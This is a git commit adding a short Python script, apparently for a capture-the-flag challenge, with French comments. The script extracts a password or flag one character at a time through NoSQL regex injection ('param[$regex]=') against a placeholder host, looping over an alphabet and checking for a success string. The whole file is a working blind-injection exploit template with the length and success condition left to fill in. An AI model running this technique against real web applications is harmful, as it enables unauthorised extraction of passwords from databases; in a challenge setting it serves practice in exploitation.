0d11df25700c7e35233a2cff6079a343e3b6f72f
night <80219594+0x14mth3n1ght@users.noreply.github.com>
2021-05-22 18:18:37 +0200

    Create NOSQL.py

---
+++ NOSQL.py
@@ -0,0 +1,17 @@
+'''Trouver la lngueur du mot de passe:'''
+#http://chall.com?param=[$regex]=.{i} -> faire varier i
+
+import requests, string
+
+alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@-+/()!\"$%=^[]:;"
+
+taille=#taille du mot de passe à remplir
+flag = ""
+for i in range(taille, -1, -1):
+    print("[i] Looking for char number "+str(taille-i+1))
+    for char in alphabet:
+        r = requests.get("http://chall.com?param[$regex]="+flag+char+".{"+str(i)+"}")
+        if ("True response" in r.text): #a modifier
+            flag += char
+            print("[+] Flag: "+flag)
+            break
